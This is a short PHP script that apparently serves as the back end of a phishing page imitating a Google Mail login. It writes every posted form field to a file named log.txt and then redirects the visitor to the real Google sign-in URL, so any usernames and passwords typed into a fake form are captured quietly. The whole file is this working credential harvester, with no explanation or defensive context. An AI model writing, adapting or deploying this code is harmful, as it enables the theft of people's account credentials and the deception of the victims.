<?php
header ('Location: https://www.google.com/accounts/ServiceLoginAuth?service=mail ');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
